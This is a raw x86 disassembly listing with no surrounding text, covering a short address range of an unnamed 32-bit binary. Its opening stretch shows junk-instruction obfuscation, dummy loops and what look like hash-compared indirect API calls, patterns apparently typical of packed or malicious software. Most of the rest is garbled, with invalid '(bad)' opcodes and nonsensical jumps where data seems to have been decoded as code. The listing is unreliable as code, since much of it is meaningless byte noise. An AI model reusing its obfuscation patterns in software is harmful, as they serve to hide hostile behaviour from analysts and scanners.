  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x586f29ff,eax
  408b09:	out    dx,eax
  408b0a:	imul   ebp,edx,0x137b7be5
  408b10:	pushf  
  408b11:	jnp    0x408b8e
  408b13:	int3   
  408b14:	cmp    ch,0xa6
  408b17:	adc    edx,eax
  408b19:	mov    bh,0x44
  408b1b:	cmc    
  408b1c:	jl     0x408b24
  408b1e:	or     DWORD PTR [ebx+eax*4],ecx
  408b21:	inc    edi
  408b22:	pop    ebp
  408b23:	out    dx,eax
  408b24:	push   edx
  408b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b26:	xor    esp,ecx
  408b28:	inc    esi
  408b29:	push   ds
  408b2a:	dec    eax
  408b2b:	pop    eax
  408b2c:	(bad)  
  408b2d:	cmp    al,0x81
  408b2f:	push   esi
  408b30:	retf   0x1896
  408b33:	clc    
  408b34:	cmp    ecx,DWORD PTR [edx]
  408b36:	test   BYTE PTR ss:[eax+0x1cfa5324],0x49
  408b3e:	sbb    al,0xad
  408b40:	adc    al,0xef
  408b42:	ficomp WORD PTR [esi+0x738d3fa8]
  408b48:	lds    esi,FWORD PTR [edx-0x3e]
  408b4b:	cmp    al,0x53
  408b4d:	shr    DWORD PTR [ebx-0x2500d25],1
  408b53:	push   eax
  408b54:	pop    esi
  408b55:	add    DWORD PTR [ecx+0x49],edi
  408b58:	jnp    0x408ba2
  408b5a:	and    eax,0x97983015
  408b5f:	not    bl
  408b61:	rcl    esp,1
  408b63:	xchg   ecx,eax
  408b64:	(bad)  
  408b65:	sub    esp,DWORD PTR [edx+ecx*2+0x4f]
  408b69:	cbw    
  408b6b:	adc    esi,DWORD PTR [ebp-0x72]
  408b6e:	mov    bh,0xe9
  408b70:	loope  0x408b6f
  408b72:	es inc esp
  408b74:	outs   dx,BYTE PTR ds:[esi]
  408b75:	mov    ds:0xa2bc480,al
  408b7a:	push   esp
  408b7b:	dec    edi
  408b7c:	xchg   edi,eax
  408b7d:	rol    BYTE PTR [edi+eax*4-0x12905696],0x5d
  408b85:	inc    esp
  408b87:	sar    bl,cl
  408b89:	add    al,0x48
  408b8b:	(bad)  [ebp+ebp*2+0x21f4c6bb]
  408b92:	in     eax,0xc9
  408b94:	out    0xc6,eax
  408b96:	xchg   edx,eax
  408b97:	lahf   
  408b98:	pop    es
  408b99:	mov    ?,ecx
  408b9b:	mov    ah,0xa0
  408b9d:	mov    cl,0x46
  408b9f:	or     eax,0x79e9c2fb
  408ba4:	cld    
  408ba5:	mov    esi,0x9e3aa39b
  408baa:	inc    edx
  408bab:	adc    BYTE PTR [edx-0xe4ba1d1],0x1f
  408bb2:	in     eax,dx
  408bb3:	and    edi,ecx
  408bb5:	daa    
  408bb6:	push   ebx
  408bb7:	aam    0xfc
  408bb9:	mov    ds:0x94324318,al
  408bbe:	fadd   QWORD PTR [edi+0x4]
  408bc1:	sbb    DWORD PTR [ebx-0x2aa4822f],edx
  408bc7:	jmp    0x8b1a58a6
  408bcc:	mov    esi,0xc33dc348
  408bd1:	pop    ss
  408bd2:	jnp    0x408bc8
  408bd4:	mov    bh,0xc6
  408bd6:	xchg   esp,eax
  408bd7:	dec    eax
  408bd8:	in     eax,dx
  408bd9:	imul   eax,edx,0xffffffec
  408bdc:	add    BYTE PTR [edx],ch
  408bde:	jb     0x408c29
  408be0:	add    BYTE PTR [ebx+0x6dd3dfd3],cl
  408be6:	ror    ch,0x9e
  408be9:	adc    eax,0xc7a21a33
  408bee:	sub    bl,bh
  408bf0:	sub    BYTE PTR [ecx+0x75f7c152],al
  408bf6:	loop   0x408c70
  408bf8:	int3   
  408bf9:	push   ss
  408bfa:	inc    edx
  408bfb:	ins    BYTE PTR es:[edi],dx
  408bfc:	pop    esp
  408bfd:	mov    ds:0x2670fa26,al
  408c02:	add    al,dl
  408c04:	pop    eax
  408c05:	in     al,dx
  408c06:	cmp    DWORD PTR ds:0xdd0b6b86,esi
  408c0c:	ins    DWORD PTR es:[edi],dx
  408c0d:	and    BYTE PTR ss:[eax+edi*1],bh
  408c11:	int3   
  408c12:	dec    ebx
  408c13:	jnp    0x408c00
  408c15:	or     DWORD PTR [ebp+0x2716e3a8],0xffffff9a
  408c1c:	cmp    al,0xe3
  408c1e:	or     edx,ecx
  408c20:	mov    dh,0x5f
  408c22:	cs inc esi
  408c24:	dec    ebx
  408c25:	and    ebx,DWORD PTR [edx]
  408c27:	fsubr  DWORD PTR [edx-0x1a643c98]
  408c2d:	pop    esi
  408c2e:	mov    edx,0x7f866ba0
  408c33:	mov    edx,?
  408c35:	adc    al,0x26
  408c37:	test   eax,0x5e1e0cf9
  408c3c:	jp     0x408c89
  408c3e:	sub    edi,esi
  408c40:	jg     0x408bc6
  408c42:	idiv   cl
  408c44:	cmp    BYTE PTR [edi],dh
  408c46:	(bad)  [esi]
  408c48:	fstp   DWORD PTR [ecx+0x74]
  408c4b:	dec    ebp
  408c4c:	mov    cl,0xe8
  408c4e:	pop    edx
  408c4f:	adc    eax,0xa385140e
  408c54:	mov    esp,0xca42665
  408c59:	aaa    
  408c5a:	enter  0xa801,0x6
  408c5e:	les    eax,FWORD PTR [eax+edx*2]
  408c61:	or     al,BYTE PTR [edi]
  408c63:	clc    
  408c64:	push   es
  408c65:	adc    al,0x4
  408c67:	mov    dl,0xe4
  408c69:	shl    BYTE PTR [ebp+edx*2+0x44],1
  408c6d:	jne    0x408c07
  408c6f:	cmp    bl,BYTE PTR [edx+0x7e]
  408c72:	aam    0x25
  408c74:	and    eax,0xf97f6d6c
  408c7a:	and    al,0xd4
  408c7c:	mov    ch,0xb2
  408c7e:	daa    
  408c7f:	test   BYTE PTR [edx],ah
  408c81:	pop    edx
  408c82:	sbb    al,0x38
  408c84:	out    dx,eax
  408c85:	xchg   ebp,eax
  408c86:	pop    edx
  408c87:	dec    ebp
  408c88:	or     edi,DWORD PTR [ebx+0x1d87147a]
  408c8e:	mov    ch,0x65
  408c90:	jmp    0x408d0a
  408c92:	xor    al,0xf6
  408c94:	cmp    al,0x6a
  408c96:	dec    ecx
  408c97:	retf   0x73e7
  408c9a:	push   ecx
  408c9b:	mov    eax,ds:0x50a12ed8
  408ca0:	mov    bl,0x5
  408ca2:	cmp    eax,0x4a3b7de4
  408ca7:	jmp    FWORD PTR [ecx+0x29]
  408caa:	retf   
  408cab:	sar    ebp,1
  408cad:	hlt    
  408cae:	ins    BYTE PTR es:[edi],dx
  408caf:	loop   0x408c8e
  408cb1:	xchg   esi,eax
  408cb2:	icebp  
  408cb3:	sub    bh,BYTE PTR [edx]
  408cb5:	ss push ds
  408cb7:	mov    eax,0x40ee62d0
  408cbc:	iret   
  408cbd:	int    0xe9
  408cbf:	jg     0x408c4c
  408cc1:	inc    esp
  408cc2:	pop    ebp
  408cc3:	test   bh,0xa5
  408cc6:	add    BYTE PTR [esi-0x4b],dl
  408cc9:	mov    ecx,0x1011b7a6
  408cce:	das    
  408ccf:	jo     0x408c6b
  408cd1:	je     0x408d10
  408cd3:	xchg   esp,eax
  408cd4:	push   esp
  408cd5:	mov    DWORD PTR [eax+0x7008c0f0],eax
  408cdb:	cmovb  eax,DWORD PTR [esi]
  408cde:	in     al,0xf9
  408ce0:	test   BYTE PTR [eax+0x6e],al
  408ce3:	pushaw 
  408ce5:	mov    dl,0x4d
  408ce7:	arpl   WORD PTR [esi+0x3c3c5276],si
  408ced:	or     dl,0x3
  408cf0:	push   ss
  408cf1:	(bad)  
  408cf2:	xor    al,0x6c
  408cf4:	pop    esi
  408cf5:	mov    dl,0x5c
  408cf7:	std    
  408cf8:	hlt    
  408cf9:	mov    DWORD PTR [edx+eax*8+0x136cca09],ebp
  408d00:	pop    eax
  408d01:	(bad)  
  408d02:	cmp    ch,BYTE PTR [edx-0x1e]
  408d05:	aad    0xda
  408d07:	mov    fs,WORD PTR [eax+0x2b60adcb]
  408d0d:	fsubr  st(4),st
  408d0f:	and    BYTE PTR [ecx-0xfd6c4],0x44
  408d16:	ins    DWORD PTR es:[edi],dx
  408d17:	mov    ebp,0x24dfada6
  408d1c:	and    ah,BYTE PTR [esi]
  408d1e:	loop   0x408ced
  408d20:	sub    bh,BYTE PTR [esi+0x16]
  408d23:	mov    eax,ds:0x6c35a97f
  408d28:	call   0x970d870
  408d2d:	dec    edi
  408d2e:	add    DWORD PTR [edi-0x10],edx
  408d31:	repz and ch,ah
  408d34:	aam    0x6a
  408d36:	cmp    eax,0xa19e792a
  408d3b:	lods   eax,DWORD PTR ds:[esi]
  408d3c:	dec    edi
  408d3d:	and    DWORD PTR [edi+0x3f],esp
  408d40:	lods   al,BYTE PTR ds:[esi]
  408d41:	add    BYTE PTR [edx-0x2c893a1e],0x8f
  408d48:	rcr    bh,cl
  408d4a:	push   0xb0a17d80
  408d4f:	mov    eax,0x85fd41a8
  408d54:	mov    DWORD PTR [eax],edi
  408d56:	dec    ebx
  408d57:	jae    0x408d9d
  408d59:	mov    al,0x4e
  408d5b:	les    ebp,FWORD PTR [ebp+0x15]
  408d5e:	mov    dl,ch
  408d60:	addr16 retf 0x996f
  408d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d65:	and    DWORD PTR [ebp+0x5],0xbbf67ae8
  408d6c:	in     al,0xf5
  408d6e:	xor    esp,DWORD PTR [ebp+0x3b71538b]
  408d74:	push   cs
  408d75:	add    sp,0x5834
  408d7a:	iret   
  408d7b:	sub    eax,DWORD PTR [edx-0x55]
  408d7e:	sub    al,0x9a
  408d80:	mov    ebx,0xdd11c5c1
  408d85:	mov    bl,0x9f
  408d87:	les    edi,FWORD PTR [ebx+0x5b]
  408d8a:	call   0xadf38949
  408d8f:	pop    ebp
  408d90:	(bad)
  408d93:	xor    DWORD PTR [ebx],esp
  408d95:	inc    ecx
  408d96:	mov    edx,0x93743ab0
  408d9b:	(bad)  
  408d9c:	dec    eax
  408d9d:	out    0x60,eax
  408d9f:	xchg   ebx,eax
  408da0:	and    al,0x53
  408da2:	inc    esi
  408da3:	retf   
  408da4:	push   ss
  408da5:	jl     0x408d3a
  408da7:	popa   
  408da8:	mov    bh,0x20
  408daa:	in     al,dx
  408dab:	jbe    0x408da3
  408dad:	mov    al,ds:0xf21bb97e
  408db2:	mov    edi,0xefebdf70
  408db7:	retf   
  408db8:	adc    ecx,DWORD PTR [ebx]
  408dba:	sti    
  408dbb:	jg     0x408e00
  408dbd:	ficom  DWORD PTR [ebx+edx*2+0x99aba75]
  408dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc5:	es push eax
  408dc7:	stos   BYTE PTR es:[edi],al
  408dc8:	test   BYTE PTR [edi],ah
  408dca:	and    DWORD PTR [edx],0xfffffff1
  408dcd:	cmp    eax,0xddbca144
  408dd2:	cmp    bl,BYTE PTR [eax]
  408dd4:	xchg   edx,eax
  408dd5:	and    BYTE PTR [ebx],0x32
  408dd8:	sbb    bh,al
  408dda:	xor    esp,ecx
  408ddc:	add    ecx,esi
  408dde:	addr16 jb 0x408d64
  408de1:	pop    es
  408de2:	loop   0x408de9
  408de4:	sub    eax,0xe63be823
  408de9:	add    esi,DWORD PTR [edx+0x11c640e2]
  408def:	jle    0x408df6
  408df1:	add    al,BYTE PTR [eax]
  408df3:	xchg   ecx,eax
  408df4:	(bad)  
  408df6:	int3   
  408df7:	push   ss
  408df8:	adc    DWORD PTR [edx],0xffffffa6
  408dfb:	and    DWORD PTR [ecx*4-0x3ffea6bd],0xff03ab0c
  408e06:	mov    cl,0x8f
  408e08:	dec    edx
  408e09:	ror    ecx,cl
  408e0b:	fistp  DWORD PTR [edx+0x4b266937]
  408e11:	push   cs
  408e12:	out    0x1d,al
  408e14:	mov    eax,0x333e597c
  408e19:	cmc    
  408e1a:	xchg   esp,eax
  408e1b:	xchg   edx,eax
  408e1c:	push   ebx
  408e1d:	(bad)  
  408e1e:	stos   BYTE PTR es:[edi],al
  408e1f:	rcr    BYTE PTR [ebp+0x61],0x1b
  408e23:	xchg   esi,eax
  408e24:	arpl   WORD PTR [ecx-0x368452d8],cx
  408e2a:	sti    
  408e2b:	xchg   DWORD PTR [ebp-0x32b364d2],ebp
  408e31:	xchg   ebp,eax
  408e32:	xor    BYTE PTR [ebx-0x29a5890],dl
  408e38:	loopne 0x408e03
  408e3a:	scas   al,BYTE PTR es:[edi]
  408e3b:	fcomp  DWORD PTR [edx+0x10]
  408e3e:	leave  
  408e3f:	inc    ebx
  408e40:	jnp    0x408e0d
  408e42:	int    0xf
  408e44:	push   ss
  408e45:	adc    eax,DWORD PTR [esi+0x405ca206]
  408e4b:	je     0x408de3
  408e4d:	or     al,0xc6
  408e4f:	(bad)  
  408e50:	popa   
  408e51:	(bad)  
  408e52:	inc    BYTE PTR [ecx+ecx*8]
  408e55:	call   0x6d48:0x570504ff
  408e5c:	ds and eax,0x5fa37045
  408e62:	scas   al,BYTE PTR es:[edi]
  408e63:	cmp    BYTE PTR [edx],bh
  408e65:	inc    esp
  408e66:	add    BYTE PTR [edx+ecx*4],0xc4
  408e6a:	retf   
  408e6b:	fs push esp
  408e6d:	stc    
  408e6e:	push   edx
  408e6f:	add    DWORD PTR [eax+eax*1],esp
  408e72:	shl    DWORD PTR [eax],0xd1
  408e75:	std    
  408e76:	mov    ds:0xbc516a09,eax
  408e7b:	mov    cl,0xca
  408e7d:	sbb    esi,eax
  408e7f:	fsub   DWORD PTR ds:0xf3f00bca
  408e85:	and    al,0xaf
  408e87:	cvtpi2ps xmm0,QWORD PTR ds:0xa3817aaf
  408e8e:	cwde   
  408e8f:	arpl   bx,bp
  408e91:	xor    dl,BYTE PTR [edi]
  408e93:	scas   eax,DWORD PTR es:[edi]
  408e94:	pop    ebx
  408e95:	test   DWORD PTR [eax],ebx
  408e97:	push   esp
  408e98:	ror    DWORD PTR [ebx-0x47b2cb8f],1
  408e9e:	or     edx,DWORD PTR [ebx-0x37]
  408ea1:	cvtps2pi mm1,xmm6
  408ea4:	mov    ecx,0x7d4cc721
  408ea9:	dec    eax
  408eaa:	dec    edx
  408eab:	inc    edx
  408eac:	lahf   
  408ead:	or     edi,edi
  408eaf:	adc    BYTE PTR [ebx+0x7c2e2c7c],bh
  408eb5:	fild   WORD PTR [eax+edx*8+0xbbe3fbc]
  408ebc:	or     DWORD PTR [esi],eax
  408ebe:	pop    eax
  408ebf:	sti    
  408ec0:	mov    dl,0x15
  408ec2:	mov    ebp,0xafb25033
  408ec7:	mov    ecx,0xb1073712
  408ecc:	inc    edx
  408ecd:	arpl   bx,ax
  408ecf:	jb     0x408ebd
  408ed1:	cmp    BYTE PTR [eax-0x847d5d9],bl
  408ed7:	fisttp WORD PTR cs:[edx-0x7e]
  408edb:	jle    0x408e86
  408edd:	sbb    ebx,DWORD PTR [ebx+0x10af270]
  408ee3:	jg     0x408ea7
  408ee5:	imul   edi,DWORD PTR [ebx-0x74],0xffffffcd
  408ee9:	imul   ebp,DWORD PTR [ecx-0x11],0x518c2fb6
  408ef0:	adc    BYTE PTR [edx-0x5e33d797],0x6d
  408ef7:	or     al,0xb
  408ef9:	int    0x88
  408efb:	or     DWORD PTR [ebx],0xffffffb6
  408efe:	inc    ebx
  408eff:	mov    edx,0xb7122cc0
  408f04:	cdq    
  408f05:	xor    DWORD PTR [eax+0x53],esp
  408f08:	call   0xecaf:0x6d401b35
  408f0f:	jmp    0xbabde35e
  408f14:	mov    esi,0xee1aab5c
  408f19:	fmul   QWORD PTR ss:[edi+0x265882ae]
  408f20:	clc    
  408f21:	adc    al,0x8a
  408f23:	adc    edi,esp
  408f25:	xlat   BYTE PTR ds:[ebx]
  408f26:	add    eax,0xe304ae48
  408f2b:	call   0x282a9337
  408f30:	pop    ebx
  408f31:	xchg   ebp,eax
  408f32:	aad    0xe1
  408f34:	pop    ss
  408f35:	lds    ecx,FWORD PTR [edi+ebx*2-0x4e8fc621]
  408f3c:	gs (bad) 
  408f3e:	retf   
  408f3f:	mul    BYTE PTR [ebx]
  408f41:	int3   
  408f42:	scas   eax,DWORD PTR es:[edi]
  408f43:	cmp    al,0x28
  408f45:	fsubr  QWORD PTR [esi+0x2f549186]
  408f4b:	daa    
  408f4c:	lea    edi,[eax+0x65]
  408f4f:	push   ds
  408f50:	in     al,dx
  408f51:	xor    al,0x8d
  408f53:	cli    
  408f54:	into   
  408f55:	arpl   si,dx
  408f57:	aas    
  408f58:	in     eax,0x68
  408f5a:	xor    bl,bh
  408f5c:	(bad)  
  408f5d:	mov    eax,0x3474d039
  408f62:	stc    
  408f63:	enter  0x2b8e,0x9c
  408f67:	out    dx,al
  408f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f69:	inc    DWORD PTR [eax]
  408f6b:	out    dx,al
  408f6c:	scas   al,BYTE PTR es:[edi]
  408f6d:	out    0xe8,eax
  408f6f:	mov    esi,0xbc7b9b8c
  408f74:	adc    BYTE PTR [esi-0x4],ch
  408f77:	push   esi
  408f78:	(bad)  
  408f79:	inc    eax
  408f7a:	stos   DWORD PTR es:[edi],eax
  408f7b:	sbb    eax,0x941ffd0f
  408f80:	repz cmp bl,BYTE PTR [ebx-0x4ff54981]
  408f87:	adc    DWORD PTR [edx+0x7b],0x69
  408f8b:	sahf   
  408f8c:	lds    ecx,FWORD PTR [ebx]
  408f8e:	test   dh,0x8f
  408f91:	jae    0x408f1e
  408f93:	test   al,0x77
  408f95:	lods   eax,DWORD PTR ds:[esi]
  408f96:	xchg   ebp,eax
  408f97:	jnp    0x408fd0
  408f99:	xor    BYTE PTR [esi-0x10],dh
  408f9c:	or     BYTE PTR [edx+0x3d],cl
  408f9f:	jmp    DWORD PTR [ebx+0x58a40f2]
  408fa5:	inc    esi
  408fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fa7:	cli    
  408fa8:	push   ebx
  408fa9:	xor    ebx,DWORD PTR [ecx]
  408fab:	pop    ds
  408fac:	retf   
  408fad:	stos   BYTE PTR es:[edi],al
  408fae:	es xchg ecx,eax
  408fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb1:	xor    ecx,DWORD PTR [esp+esi*1+0x54]
  408fb5:	lods   al,BYTE PTR ds:[esi]
  408fb6:	pop    es
  408fb7:	jp     0x408f3d
  408fb9:	mov    eax,0xea798c20
  408fbe:	mov    ebx,0x111a7ec
  408fc3:	cmp    BYTE PTR [edi+0x46e4c0e2],ch
  408fc9:	xor    ebx,esi
  408fcb:	push   es
  408fcc:	ror    BYTE PTR [ebx+0x165b807],cl
  408fd2:	fwait
  408fd3:	mov    ch,0x51
  408fd5:	shl    DWORD PTR [ebx],1
  408fd7:	lods   eax,DWORD PTR ds:[esi]
  408fd8:	mov    edi,0x5728cadc
  408fdd:	sahf   
  408fde:	push   esi
  408fdf:	sbb    ebp,DWORD PTR [ebp+0x60c5aa41]
  408fe5:	sbb    al,0x9e
  408fe7:	ror    BYTE PTR [edx],1
  408fe9:	addr16 cs cli 
  408fec:	sbb    cl,BYTE PTR ds:0x8fbd4f65
  408ff2:	loopne 0x408fca
  408ff4:	test   DWORD PTR [edi+0x2d02a631],eax
  408ffa:	sbb    eax,0x2f153d97
  408fff:	dec    esp
  409000:	mov    ch,0xb4
  409002:	out    0x6f,al
  409004:	inc    ebp
  409005:	cmp    eax,0xebbd92c5
  40900a:	pop    eax
  40900b:	call   DWORD PTR ds:0xf7b9f77b
  409011:	mov    dh,0x25
  409013:	(bad)  
  409015:	out    dx,al
  409016:	es pusha 
  409018:	pop    ss
  409019:	or     bh,BYTE PTR [ebx+ebx*4+0x1fe567]
  409020:	jmp    0x6b8ae37c
  409025:	ss scas eax,DWORD PTR es:[edi]
  409027:	sub    BYTE PTR [edx],cl
  409029:	repnz enter 0x7354,0xa3
  40902e:	mov    eax,edi
  409030:	lds    esi,FWORD PTR gs:[ecx+0x31]
  409034:	xchg   DWORD PTR [ebp-0x2d],ebp
  409037:	adc    eax,0x5d44c6fd
  40903c:	cmp    al,0x21
  40903f:	daa    
  409040:	pop    ebp
  409041:	shr    BYTE PTR [ebp+0x7412fdfb],1
  409047:	pop    ebp
  409048:	aaa    
  409049:	jp     0x4090b3
  40904b:	adc    ah,BYTE PTR [eax-0x60]
  40904e:	repz xlat BYTE PTR ds:[ebx]
  409050:	es in  eax,0xf3
  409053:	lods   eax,DWORD PTR ds:[esi]
  409054:	aas    
  409055:	pop    edx
  409056:	ja     0x4090b5
  409058:	mov    ah,0x51
  40905a:	and    al,0x19
  40905c:	pop    edx
  40905d:	shr    BYTE PTR [ecx-0xc],cl
  409060:	test   DWORD PTR [esp+ebp*1-0x711db1c5],eax
  409067:	xchg   esi,eax
  409068:	xchg   edx,eax
  409069:	icebp  
  40906a:	add    BYTE PTR [ebx+edi*8-0xbeb96fd],0xae
  409072:	jns    0x409023
  409074:	mov    edi,0xfb665b07
  409079:	push   esi
  40907a:	jg     0x409045
  40907c:	mov    ah,0x3f
  40907e:	cmp    esi,DWORD PTR [edx+edx*1+0x29]
  409082:	sar    DWORD PTR [ebp+0x36b8004e],1
  409088:	push   ebx
  409089:	xlat   BYTE PTR ds:[ebx]
  40908a:	push   cs
  40908b:	jo     0x409097
  40908d:	add    esi,edi
  40908f:	jae    0x409097
  409091:	inc    edx
  409092:	js     0x4090ea
  409094:	pop    esi
  409095:	mov    ecx,0x548f1d9e
  40909a:	sti    
  40909b:	sub    BYTE PTR [edi],0x6b
  40909e:	outs   dx,DWORD PTR ds:[esi]
  40909f:	jmp    0x20ef92ca
  4090a4:	jne    0x4090ad
  4090a6:	(bad)  
  4090a7:	pop    ebx
  4090a8:	fisub  DWORD PTR [ecx]
  4090aa:	stos   BYTE PTR es:[edi],al
  4090ab:	push   ebx
  4090ac:	xchg   ebx,eax
  4090ad:	dec    ecx
  4090ae:	jnp    0x40909a
  4090b0:	jge    0x409088
  4090b2:	cmp    eax,0x301facb6
  4090b7:	stos   DWORD PTR es:[edi],eax
  4090b8:	and    ecx,DWORD PTR [edx+ebx*2-0x2a]
  4090bc:	test   ah,ah
  4090be:	cmp    al,0xa6
  4090c0:	stos   BYTE PTR es:[edi],al
  4090c1:	or     DWORD PTR ds:0x37ed2d79,esp
  4090c7:	add    BYTE PTR [eax+0x7e70c42e],al
  4090cd:	pop    edi
  4090ce:	outs   dx,DWORD PTR ds:[esi]
  4090cf:	mov    cl,0x5b
  4090d1:	jge    0x409109
  4090d3:	enter  0x4c30,0x2a
  4090d7:	mov    al,0x83
  4090d9:	rcr    DWORD PTR [eax+0x27],cl
  4090dc:	es push edx
  4090de:	pop    es
  4090df:	jns    0x40906f
  4090e1:	jge    0x4090c3
  4090e3:	xchg   ecx,eax
  4090e4:	(bad)  
  4090e5:	(bad)  
  4090e6:	mov    ebx,0x62ba5a9b
  4090eb:	sbb    bh,bh
  4090ed:	stc    
  4090ee:	or     DWORD PTR [ecx],ebx
  4090f0:	pop    edx
  4090f1:	lods   eax,DWORD PTR ds:[esi]
  4090f2:	scas   al,BYTE PTR es:[edi]
  4090f3:	xor    al,0x51
  4090f5:	push   ds
  4090f6:	(bad)  
  4090f7:	jnp    0x4090e3
  4090f9:	mov    edi,0xcdc555d1
  4090fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090ff:	cmp    eax,DWORD PTR [ecx]
  409101:	das    
  409102:	pushf  
  409103:	mov    eax,0x216c9c72
  409108:	mov    dh,0x21
  40910a:	test   al,0x85
  40910c:	inc    esi
  40910d:	pusha  
  40910e:	out    dx,eax
  40910f:	add    bl,cl
  409111:	das    
  409112:	inc    esp
  409113:	cs pop ecx
  409115:	cmp    bh,BYTE PTR [ecx]
  409117:	jne    0x40914f
  409119:	dec    esi
  40911a:	cmp    eax,0xe9e3d138
  40911f:	adc    bh,BYTE PTR [edx+0x206613b7]
  409125:	add    ch,BYTE PTR [edi+eax*8+0x264e0ad7]
  40912c:	inc    eax
  40912d:	pusha  
  40912e:	loopne 0x409159
  409130:	cwde   
  409131:	add    eax,0x76c284c6
  409136:	mov    dh,0x2e
  409138:	rol    esp,1
  40913a:	pushf  
  40913b:	xor    eax,0xaf5fe35c
  409140:	pop    ds
  409141:	cwde   
  409142:	xchg   BYTE PTR [edi],dh
  409144:	mov    edx,0x2f8b1eb2
